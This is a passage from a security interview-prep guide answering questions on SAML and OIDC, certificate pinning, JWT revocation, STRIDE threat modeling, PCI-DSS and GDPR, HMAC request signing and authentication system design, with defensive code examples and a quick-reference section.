1. User accesses Salesforce (Service Provider = SP)
2. Salesforce: "You need to authenticate. Redirecting to IdP..."
3. Browser redirects to: https://okta.com/sso/saml?SAMLRequest=<encoded>
4. User authenticates with Okta (IdP = Identity Provider)
5. Okta builds SAML Assertion (XML):
   <saml:Assertion>
     <saml:Subject>alice@company.com</saml:Subject>
     <saml:AttributeStatement>
       <saml:Attribute Name="email">alice@company.com</saml:Attribute>
       <saml:Attribute Name="role">sales_manager</saml:Attribute>
     </saml:AttributeStatement>
     Signature: [Okta's digital signature]
   </saml:Assertion>

6. Okta redirects browser to Salesforce with SAML Assertion in POST body
7. Salesforce verifies Okta's signature (using Okta's public certificate)
8. Salesforce creates local session, logs user in as alice@company.com

Same flow for other SPs (Jira, Confluence, GitHub Enterprise):
  User already has Okta session -> steps 3-5 skipped -> instant SSO
```

**OIDC (OpenID Connect):**
Built on OAuth 2.0. Returns ID token (JWT) in addition to access token. Preferred for modern web/mobile apps.

```
Flow (Authorization Code with OIDC):

1. User clicks "Sign in with Google"
2. App redirects to: https://accounts.google.com/o/oauth2/auth?
     response_type=code&client_id=...&scope=openid email profile&...

3. User authenticates with Google

4. Google redirects to: https://app.com/callback?code=abc123

5. App exchanges code for tokens:
   POST https://oauth2.googleapis.com/token
   -> {
        access_token: "...",
        id_token: "eyJhbGc...",  <- JWT with user identity
        expires_in: 3600
      }

6. App decodes ID token:
   {
     sub: "10769150350006150715113082367",  <- Google's unique user ID
     email: "alice@gmail.com",
     name: "Alice Smith",
     iss: "https://accounts.google.com",
     aud: "my-client-id",
     exp: 1747226000
   }

7. App creates local session using the 'sub' claim as stable user identifier
```

**SAML vs OIDC comparison:**

| Aspect | SAML | OIDC |
|--------|------|------|
| Standard | XML-based | JSON/JWT-based |
| Protocol | SOAP/XML | REST/HTTP |
| Primary use | Enterprise B2B | Consumer/modern apps |
| Mobile support | Poor (browser redirects) | Good (native SDKs) |
| API access | No | Yes (access tokens) |
| Complexity | High | Lower |
| IdP examples | Okta, ADFS, Ping | Google, Okta, Auth0, Azure AD |
| Adoption | Legacy enterprise | Modern web/mobile |

**When to use which:**
- **SAML:** Integrating with corporate IT systems (Salesforce, Workday, SAP), enterprise customers who mandate SAML.
- **OIDC:** New applications, mobile apps, consumer applications, when you also need API authorization.

---

### Q15. What is certificate pinning, and when should you use it?

**Answer:**

**Certificate pinning** (or public key pinning) is a security technique where an application hardcodes or explicitly trusts specific certificate(s) or public key(s), rather than trusting the full CA chain.

**Why standard TLS can be insufficient:**
A standard TLS client trusts any certificate signed by any of hundreds of trusted CAs in the OS trust store. If any CA is compromised (or coerced), they can issue a fraudulent certificate for any domain.

**Historical examples:**
- 2011: DigiNotar CA was compromised → attackers issued fraudulent Google, Facebook certs → MitM attacks in Iran.
- 2012: Trustwave admitted issuing a subordinate CA cert to a corporation for corporate SSL inspection.

**Certificate pinning prevents this:**
```
Without pinning:
  App connects to api.mybank.com:
    -> Receives certificate signed by DigiCert
    -> Checks: Is DigiCert in trusted CAs? Yes.
    -> Connects (even if certificate is fraudulent but validly signed)

With certificate pinning:
  App connects to api.mybank.com:
    -> Receives certificate
    -> Checks: Does this cert's public key hash match my pinned hash?
    -> Pinned hash: sha256("bank's actual public key") = "abc123..."
    -> Received cert hash: "xyz789..." (fraudulent cert from compromised CA)
    -> REJECT connection! Certificate doesn't match pin.
```

**Implementation approaches:**

**1. Leaf certificate pinning:**
Pin the specific end-entity certificate.
```
Risk: Certificate rotates (every 1-2 years) -> app breaks if not updated simultaneously
```

**2. Public key pinning (recommended):**
Pin the public key (which can remain stable across certificate renewals if you control issuance):
```python
# Python requests with pinning:
import ssl, hashlib, base64

def verify_pin(cert, expected_pin):
    pub_key = cert.public_bytes(Encoding.DER)
    actual_pin = base64.b64encode(hashlib.sha256(pub_key).digest()).decode()
    return actual_pin == expected_pin

# Or use tls-pinning libraries per platform
```

**3. Backup pins:**
Always include at least 2 pins: current + backup (for key rotation):
```
Primary pin: sha256/abc123... (current key)
Backup pin:  sha256/xyz789... (future key, already generated, not yet deployed)
```

**Mobile implementation:**
```swift
// iOS NSURLSession certificate pinning
func urlSession(_ session: URLSession, 
                didReceive challenge: URLAuthenticationChallenge, 
                completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
    
    guard let serverTrust = challenge.protectionSpace.serverTrust,
          let certificate = SecTrustGetCertificateAtIndex(serverTrust, 0) else {
        completionHandler(.cancelAuthenticationChallenge, nil)
        return
    }
    
    let serverPublicKeyHash = getPublicKeyHash(certificate)
    if pinnedPublicKeyHashes.contains(serverPublicKeyHash) {
        completionHandler(.useCredential, URLCredential(trust: serverTrust))
    } else {
        completionHandler(.cancelAuthenticationChallenge, nil)
    }
}
```

**When to use certificate pinning:**

| Use Case | Recommendation |
|----------|----------------|
| Banking/financial mobile apps | Yes, strong requirement |
| High-value enterprise mobile apps | Yes |
| Government/defense apps | Yes |
| Regular consumer web apps | No (browser handles) |
| Internal microservices | Use mTLS instead |

**Downsides:**
- Operational complexity (certificate rotation requires app update).
- Over-aggressive pinning causes outages during legitimate cert rotation.
- Not suitable for general web browsers (breaks proxy inspection, corporate SSL decryption).
- MitM proxy tools (Burp, Charles) can bypass pinning with root CA injection + debug builds.

---

## Hard (Q16–Q20)

---

### Q16. How does the OAuth 2.0 token introspection endpoint and token revocation work at scale?

**Answer:**

At scale, JWTs are popular because they are stateless (no database lookup per request). But this creates a critical problem: how do you revoke a token that's been issued but is still within its validity window?

**The JWT revocation problem:**
```
User logs out at 10:00 AM
Access token expires at 10:15 AM
Attacker who stole the token can use it until 10:15!

JWT is self-contained and valid by signature alone.
The auth server's "I revoked this" knowledge is not checked by default.
```

**Solution 1: Short-lived tokens + refresh token rotation**
Keep access tokens very short-lived (5-15 minutes). On logout, revoke the refresh token. Maximum exposure window = access token lifetime.

```
Pro: Stateless, scalable, no central lookup
Con: Small but non-zero exposure window
```

**Solution 2: Token introspection (RFC 7662)**
Resource servers check token validity with the authorization server on every request.

```
Client request:
  GET /api/resource
  Authorization: Bearer <access_token>

Resource Server:
  POST https://auth.example.com/introspect
  {token: <access_token>, token_type_hint: "access_token"}
  
Auth Server:
  Checks if token is revoked in revocation store
  -> {active: true, sub: "user-123", exp: 1747226000, scope: "read"}
  or
  -> {active: false}  <- revoked or expired

Resource Server:
  Allow or reject based on response
```

**Problem at scale:** Introspection adds a synchronous call to the auth server on every API request. With 100K req/sec, that's 100K introspection calls/sec — auth server becomes a bottleneck.

**Scaling introspection:**

**1. Cache introspection responses:**
```
Cache key: token_hash (SHA-256 of token)
Cache TTL: min(token_remaining_lifetime, short_TTL)

Trade-off: A revoked token may still be valid for cache_TTL seconds
Typical cache TTL: 30-60 seconds (acceptable for most use cases)

Redis-based introspection cache:
  On revocation: DELETE cache[token_hash] (immediate invalidation)
  On lookup: GET cache[token_hash] -> return cached result or call auth server
```

**2. JWT with jti (JWT ID) + revocation list:**
```python
# JWT payload includes jti:
{
    "sub": "user-123",
    "jti": "unique-token-id-abc123",
    "exp": 1747226000
}

# On revocation: add jti to Redis revocation set with TTL = token expiry
redis.setex(f"revoked:{jti}", token_remaining_seconds, "1")

# On resource server: check signature (stateless) THEN check revocation list
def validate_token(token):
    claims = verify_jwt_signature(token)  # fast, stateless
    if redis.exists(f"revoked:{claims['jti']}"):  # fast, O(1) Redis lookup
        raise TokenRevokedException()
    return claims
```

**3. Event-driven revocation broadcast:**
```
Auth server revokes token:
  1. Updates revocation store (Postgres/DynamoDB)
  2. Publishes event: "TokenRevoked" {jti, exp} to Kafka/SNS
  
All resource servers:
  Subscribe to "TokenRevoked" events
  Maintain in-memory revocation set per instance
  No network call per request — check local memory only
  
Eventual consistency: ~100ms propagation delay before all nodes know about revocation
Acceptable for most use cases (logging out from web browser)
```

**Token revocation (RFC 7009):**
```
POST /revoke
Authorization: Basic <client_credentials>
{
  token: <refresh_token>,
  token_type_hint: "refresh_token"
}
-> 200 OK

Auth server: marks refresh token as revoked
No more new access tokens can be issued for this session
```

---

### Q17. How do you design STRIDE threat modeling for a payment system?

**Answer:**

**STRIDE** is a threat modeling framework developed by Microsoft that categorizes threats to help systematically identify security risks in a system.

**STRIDE categories:**

| Letter | Threat | Security Property Violated |
|--------|--------|--------------------------|
| S | Spoofing | Authentication |
| T | Tampering | Integrity |
| R | Repudiation | Non-repudiation |
| I | Information Disclosure | Confidentiality |
| D | Denial of Service | Availability |
| E | Elevation of Privilege | Authorization |

**STRIDE applied to a payment system:**

**System diagram:**
```
[Customer Browser] --HTTPS--> [API Gateway] --mTLS--> [Payment Service] ---> [Payment DB]
                                                            |
                                                    [Payment Provider API]
                                                    (Stripe, Visa, Mastercard)
```

**Spoofing threats:**
```
T: Attacker pretends to be a legitimate customer.
  Mitigation: MFA, OAuth 2.0, JWT validation, mTLS for services.

T: Malicious service pretends to be the Payment Service.
  Mitigation: mTLS with short-lived certificates, service mesh identity.

T: Phishing page pretending to be checkout page.
  Mitigation: HTTPS with HSTS, certificate transparency monitoring.
```

**Tampering threats:**
```
T: Attacker modifies payment amount in transit.
  Mitigation: TLS (encryption in transit), request signing (HMAC).

T: Attacker modifies payment record in database.
  Mitigation: Database access control, audit trail, data integrity checks.

T: Code injection via SQL/XSS in payment form.
  Mitigation: Parameterized queries, input validation, CSP headers.
```

**Repudiation threats:**
```
T: Customer denies authorizing a charge ("I never placed that order").
  Mitigation: Immutable audit log with: user ID, timestamp, IP, user agent,
              order details, payment method last 4 digits. Signed with HSM key.

T: Internal employee denies modifying a payment record.
  Mitigation: All DB changes logged with service identity + operator identity.
```

**Information Disclosure:**
```
T: Payment card data leaked from database.
  Mitigation: Store only tokenized card data (PCI DSS), never store full PAN.

T: API error messages expose internal stack traces.
  Mitigation: Generic error messages to clients, detailed logs only internally.

T: AWS S3 bucket with payment reports publicly accessible.
  Mitigation: Bucket policies, regular access audits (AWS Config rules).
```

**Denial of Service:**
```
T: Attacker floods payment endpoint with requests.
  Mitigation: Rate limiting (10 payments/min per user), WAF, CDN.

T: Resource exhaustion via large payload uploads.
  Mitigation: Request body size limits, connection timeouts.

T: Payment DB overwhelmed by queries.
  Mitigation: DB connection pool limits, read replicas, query timeouts, circuit breakers.
```

**Elevation of Privilege:**
```
T: Customer accesses another customer's payment history.
  Mitigation: IDOR prevention — always filter by authenticated user_id.

T: Payment service calls admin-only internal APIs.
  Mitigation: Service-level RBAC, mTLS authorization policy.

T: Compromised frontend service accesses payment DB directly.
  Mitigation: Network policy — frontend can only call API gateway, not DB.
```

**STRIDE process:**
1. Draw data flow diagram (DFD) — identify trust boundaries.
2. Enumerate all data flows crossing trust boundaries.
3. Apply STRIDE to each flow and component.
4. Prioritize by risk (likelihood × impact).
5. Define mitigations, assign to owners.
6. Reassess residual risk.

---

### Q18. What are the PCI-DSS and GDPR implications for system design?

**Answer:**

These regulations impose specific technical requirements on systems handling payment card data (PCI-DSS) or EU residents' personal data (GDPR). Non-compliance has severe financial and reputational consequences.

**PCI-DSS (Payment Card Industry Data Security Standard):**

**Scope:** Any system that stores, processes, or transmits cardholder data (CHD) — card number (PAN), CVV, PIN, cardholder name, expiry date.

**12 PCI-DSS Requirements (condensed):**

```
1. Network security controls (firewalls, segmentation)
2. Secure configurations (no default passwords, hardening)
3. Protect stored cardholder data
4. Encrypt transmission of CHD
5. Protect against malware
6. Secure development practices
7. Restrict access by need-to-know
8. Identify and authenticate access
9. Restrict physical access to CHD
10. Log and monitor all access
11. Regularly test systems
12. Security policy and program
```

**System design implications of PCI-DSS:**

```
NEVER store:
  - Full magnetic stripe data
  - CAV2/CVC2/CVV2 security codes  <- ever, even temporarily
  - PIN or encrypted PIN blocks

MUST protect if stored:
  - PAN (Primary Account Number): must be masked (show only last 4) or tokenized
  - Cardholder name, expiry: protect with strong cryptography

Tokenization (preferred):
  PAN: 4242 4242 4242 4242
  Token: tok_visa_randomized_string_1234
  Token stored in your DB, actual PAN in Stripe/Vault's PCI-compliant vault
  If your DB is breached: attacker gets tokens, useless without PAN vault
  
Network segmentation:
  [CHD Environment] -----[firewall]----- [Non-CHD Environment]
  PCI scope: only systems that touch CHD
  Keep scope minimal: use Stripe.js/tokenization to avoid CHD touching your servers
  
Logging:
  All access to CHD logged with: user, timestamp, action, IP
  Logs retained 12 months minimum (3 months immediately accessible)
  
Encryption at rest:
  AES-256 for stored CHD
  Key management: HSM (Hardware Security Module) for key storage
```

**GDPR (General Data Protection Regulation):**

**Scope:** Processing personal data of EU/EEA residents, regardless of company location.

**Key technical obligations:**

```
1. Privacy by Design:
   - Data minimization: collect only what you need
   - Purpose limitation: use data only for stated purpose
   - Data retention limits: delete when no longer needed
   
   Design: Automated data retention policies
     Users inactive 3 years -> anonymize or delete
     Order data: keep 7 years (tax compliance), then delete PII
     Analytics data: anonymize before archiving

2. Right to erasure ("right to be forgotten"):
   User requests deletion -> must delete from:
     - Primary DB
     - Read replicas (async, within reasonable time)
     - Backups (within 30 days or document exception)
     - CDN cache (purge)
     - Analytics tables (anonymize)
     - Third-party processors (trigger via API)
   
   Design: Crypto-shredding
     Encrypt PII with user-specific key
     On deletion: delete the key (ciphertext remains but is unreadable)
     Works even for backups (encrypted data in backup is useless without key)

3. Right to data portability:
   User can request their data in machine-readable format
   Design: Data export pipeline that generates JSON/CSV of all user data

4. Consent management:
   Store consent records:
     {user_id, consent_type, timestamp, IP, consent_version}
   Granular consent: analytics opt-in separate from marketing opt-in
   
5. Data breach notification:
   72 hours to notify supervisory authority
   Without undue delay for users when "high risk"
   Design: Incident response runbook, breach detection monitoring

6. Data processing records:
   Document: what data, for what purpose, how long, who has access
   Data Protection Impact Assessment (DPIA) for high-risk processing

7. Cross-border transfers:
   EU PII cannot be transferred to countries without adequate protection
   except via Standard Contractual Clauses (SCCs) or Binding Corporate Rules
   Design: Data residency controls, regional data isolation
```

**Overlap and conflicts:**

| PCI-DSS | GDPR |
|---------|------|
| Retain transaction logs 12 months | Minimize retention, delete when unnecessary |
| Conflict: financial records needed for audit vs user's right to erasure |
| Resolution: legal obligation overrides erasure right for specific records |

---

### Q19. What are HMAC-based request signing and API key security patterns?

**Answer:**

**API Key vs JWT vs OAuth for API authentication:**

```
API Key:
  - Simple random string: sk_live_abc123xyz789
  - Sent in header: Authorization: ApiKey sk_live_abc123xyz
  - Server looks up in DB to identify caller
  - No expiry (or very long-lived)
  - Suitable for: server-to-server, developer API access, webhooks

JWT:
  - Self-contained, signed, short-lived
  - Server verifies signature without DB lookup
  - Contains claims (user_id, roles, expiry)
  - Suitable for: user authentication, microservices

OAuth 2.0:
  - Full delegated authorization framework
  - Third-party apps accessing user resources
  - Suitable for: public APIs with third-party developers
```

**HMAC Request Signing (like AWS Signature Version 4):**
Request signing prevents replay attacks and ensures request integrity even over secure channels.

```
Problem with API keys alone:
  GET /api/transfer?amount=100&to=alice
  Authorization: ApiKey sk_live_abc123
  
  Attacker intercepts request, replays it 10 times -> 10 transfers
  Or modifies: amount=10000 -> larger transfer with valid API key

HMAC signing solution:
  Client builds canonical request string:
    METHOD\n
    PATH\n
    SORTED_QUERY_PARAMS\n
    HEADERS\n
    SHA256(BODY)
    
  Client signs:
    timestamp = "2026-05-11T10:30:00Z"
    nonce = "random-uuid-per-request"
    string_to_sign = canonical_request + timestamp + nonce
    signature = HMAC-SHA256(api_secret, string_to_sign)
    
  Client sends:
    Authorization: ApiKey abc123; Timestamp=2026-05-11T10:30:00Z;
                   Nonce=uuid-123; Signature=base64(HMAC_result)

  Server verifies:
    1. Reconstruct canonical request from received parameters
    2. Recompute signature using stored api_secret
    3. Compare signatures (constant-time comparison to prevent timing attacks)
    4. Verify timestamp is within ±5 minutes (prevents replay attacks)
    5. Check nonce has not been used before (stored in Redis with TTL=10min)
```

**Implementation:**
```python
import hmac, hashlib, base64, time

def sign_request(method, path, body, api_key, api_secret):
    timestamp = str(int(time.time()))
    nonce = str(uuid.uuid4())
    
    body_hash = hashlib.sha256(body.encode()).hexdigest()
    string_to_sign = f"{method}\n{path}\n{body_hash}\n{timestamp}\n{nonce}"
    
    signature = base64.b64encode(
        hmac.new(
            api_secret.encode(),
            string_to_sign.encode(),
            hashlib.sha256
        ).digest()
    ).decode()
    
    return {
        "Authorization": f"ApiKey {api_key}",
        "X-Timestamp": timestamp,
        "X-Nonce": nonce,
        "X-Signature": signature
    }

def verify_signature(request, stored_secret):
    # Reject if timestamp > 5 minutes old
    if abs(time.time() - int(request.headers["X-Timestamp"])) > 300:
        raise ReplayAttackException()
    
    # Reject if nonce was already used
    if redis.exists(f"nonce:{request.headers['X-Nonce']}"):
        raise ReplayAttackException()
    redis.setex(f"nonce:{request.headers['X-Nonce']}", 600, "1")
    
    # Verify signature
    expected = compute_signature(request, stored_secret)
    if not hmac.compare_digest(expected, request.headers["X-Signature"]):
        raise InvalidSignatureException()
```

**API key best practices:**
- Scope keys to specific permissions (read-only key, write key).
- Show key only once at creation; store only the hash (bcrypt) in DB.
- Support key rotation without downtime (allow 2 active keys per client during rotation).
- Rate limit per API key.
- Log all API key usage with correlation IDs.
- Notify via email on suspicious access patterns.

---

### Q20. How do you design a complete authentication system — end-to-end?

**Answer:**

Let's design an authentication system for a large-scale multi-tenant SaaS platform supporting 50M users, enterprise SSO, mobile apps, and API access.

**Requirements:**
- User authentication (password, social login, MFA)
- Enterprise SSO (SAML, OIDC)
- Mobile app support
- API access (OAuth 2.0)
- Session management and revocation
- High availability (99.99%)

**Architecture:**

```
                           [Auth Service Cluster]
                          /                      \
[Web Browser]  --------> [OIDC/SAML Provider]    [Token Service]
[Mobile App]   --------> [OAuth 2.0 AS]          [Session Store (Redis)]
[API Client]   --------> [API Key Service]        [User Store (PostgreSQL)]
[Enterprise]   --------> [SAML/OIDC Bridge]       [MFA Service]
                              |                    [Audit Log (Kafka)]
                         [API Gateway]
                         /     |      \
                   [Svc A] [Svc B] [Svc C]
```

**Component breakdown:**

**1. User Store (PostgreSQL):**
```sql
CREATE TABLE users (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    email VARCHAR(255) UNIQUE NOT NULL,
    password_hash VARCHAR(255),  -- Argon2id hash
    email_verified BOOLEAN DEFAULT FALSE,
    mfa_enabled BOOLEAN DEFAULT FALSE,
    mfa_secret_encrypted TEXT,   -- TOTP secret, AES-256 encrypted at rest
    created_at TIMESTAMPTZ DEFAULT NOW(),
    last_login TIMESTAMPTZ,
    locked_until TIMESTAMPTZ,    -- brute force protection
    failed_login_attempts INT DEFAULT 0
);

CREATE TABLE social_connections (
    user_id UUID REFERENCES users(id),
    provider VARCHAR(50),   -- 'google', 'github', 'microsoft'
    provider_user_id VARCHAR(255),
    PRIMARY KEY (provider, provider_user_id)
);
```

**2. Token Service:**
```python
class TokenService:
    def issue_tokens(self, user_id: str, scope: list) -> dict:
        # Access token (JWT, 15 min)
        access_claims = {
            "sub": user_id,
            "jti": str(uuid.uuid4()),
            "iss": "https://auth.example.com",
            "aud": "https://api.example.com",
            "scope": " ".join(scope),
            "iat": now(),
            "exp": now() + 900  # 15 minutes
        }
        access_token = jwt.encode(access_claims, private_key, algorithm="RS256")
        
        # Refresh token (opaque, 30 days, stored in Redis)
        refresh_token = secrets.token_urlsafe(32)
        redis.setex(
            f"refresh:{refresh_token}",
            30 * 24 * 3600,  # 30 days
            json.dumps({"user_id": user_id, "family": str(uuid.uuid4())})
        )
        
        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 900
        }
    
    def revoke_token(self, jti: str, exp: int):
        ttl = exp - now()
        if ttl > 0:
            redis.setex(f"revoked:{jti}", ttl, "1")
```

**3. Login flow with brute force protection:**
```python
def login(email: str, password: str, ip: str) -> dict:
    # Rate limiting: max 10 attempts per IP per 15 min
    if rate_limiter.exceeded(f"login:{ip}", limit=10, window=900):
        raise RateLimitException("Too many login attempts")
    
    user = db.get_user_by_email(email)
    if not user:
        # Constant-time fake check to prevent email enumeration
        argon2.verify(password, FAKE_HASH)
        raise AuthenticationError("Invalid credentials")
    
    if user.locked_until and user.locked_until > now():
        raise AccountLockedException()
    
    if not argon2.verify(password, user.password_hash):
        db.increment_failed_attempts(user.id)
        if user.failed_login_attempts >= 5:
            db.lock_account(user.id, duration=timedelta(minutes=15))
        audit_log.record("login_failed", user.id, ip)
        raise AuthenticationError("Invalid credentials")
    
    db.reset_failed_attempts(user.id)
    
    if user.mfa_enabled:
        # Issue partial session token (valid for MFA step only)
        partial_token = issue_mfa_challenge_token(user.id)
        return {"requires_mfa": True, "mfa_token": partial_token}
    
    audit_log.record("login_success", user.id, ip)
    return token_service.issue_tokens(user.id, ["read", "write"])

def verify_mfa(mfa_token: str, totp_code: str):
    user_id = validate_mfa_challenge_token(mfa_token)
    user = db.get_user(user_id)
    secret = decrypt_mfa_secret(user.mfa_secret_encrypted)
    
    if not totp.verify(secret, totp_code, window=1):
        raise MFAVerificationError()
    
    return token_service.issue_tokens(user_id, ["read", "write"])
```

**4. JWT validation middleware (resource servers):**
```python
def require_auth(f):
    def decorated(*args, **kwargs):
        token = get_bearer_token(request)
        
        # Step 1: Verify signature with cached JWKS
        claims = jwt.decode(token, get_public_keys(), algorithms=["RS256"],
                           audience="https://api.example.com")
        
        # Step 2: Check revocation list
        if redis.exists(f"revoked:{claims['jti']}"):
            abort(401, "Token revoked")
        
        # Step 3: Inject user context
        request.user_id = claims["sub"]
        request.scopes = claims["scope"].split()
        return f(*args, **kwargs)
    return decorated
```

**5. Enterprise SSO (SAML bridge):**
```
Enterprise customer configures:
  IdP SSO URL: https://company.okta.com/app/saml/sso
  IdP Certificate: [Okta's signing certificate]
  Attribute mapping: email <- user.email, role <- user.groups

Flow:
  Employee visits app.example.com
  -> Auth service detects corporate email domain (company.com)
  -> Redirects to company's Okta SAML endpoint
  -> Employee authenticates with Okta (existing SSO session)
  -> Okta redirects with SAML assertion
  -> Auth service validates assertion, creates/maps local user account
  -> Issues OAuth tokens for the app
```

**High availability:**
- Auth service deployed across 3 AZs, min 3 instances.
- Redis Cluster with 3 primary + 3 replica nodes for session store.
- PostgreSQL with synchronous replication (Multi-AZ RDS).
- JWKS keys cached by resource servers (refresh every hour), auth service stateless for token validation.
- Auth service failures degrade to "no new logins" — existing valid tokens continue to work during brief outages.

---

## Quick Reference

### Authentication vs Authorization
| | AuthN | AuthZ |
|--|-------|-------|
| Question | Who are you? | What can you do? |
| HTTP error | 401 | 403 |
| Mechanism | Passwords, tokens | Roles, policies |

### JWT Structure
```
Header.Payload.Signature
{alg, typ}.{sub, exp, iat, roles}.HMAC/RSA_signature
```

### Password Hashing (Best → Worst)
1. Argon2id (memory-hard, winner PHC 2015)
2. scrypt (memory-hard)
3. bcrypt (deliberate slow)
4. SHA-256 (NEVER — too fast)
5. MD5 (NEVER)

### OAuth 2.0 Token Lifetimes
| Token | Typical TTL | Storage |
|-------|------------|---------|
| Access token | 15 min | Memory |
| Refresh token | 30 days | HttpOnly cookie |
| API key | Long-lived / until revoked | Hashed in DB |

### STRIDE Threat Categories
| Letter | Threat | Mitigations |
|--------|--------|------------|
| S | Spoofing | MFA, mTLS |
| T | Tampering | TLS, HMAC signing |
| R | Repudiation | Audit logs |
| I | Info Disclosure | Encryption, masking |
| D | Denial of Service | Rate limiting, WAF |
| E | Elevation | RBAC, PoLP |

### TLS Certificate Chain
```
Root CA (in OS trust store)
  └── Intermediate CA (online, issues end-entity certs)
        └── End-Entity Cert (your server/service)
```

### Common Vulnerabilities
| Vulnerability | Fix |
|---------------|-----|
| SQL Injection | Parameterized queries |
| XSS | Escape output, CSP |
| CSRF | CSRF tokens, SameSite cookies |
| SSRF | URL allowlisting, block RFC1918 |
| IDOR | Always filter by auth user ID |

### RBAC vs ABAC
| | RBAC | ABAC |
|--|------|------|
| Complexity | Low | High |
| Flexibility | Low | High |
| Best for | Clear roles | Context-aware policies |

### Zero Trust Principles
1. Never trust, always verify
2. All communication encrypted (mTLS)
3. Least-privilege per session
4. Assume breach
5. Continuous verification
6. Microsegmentation
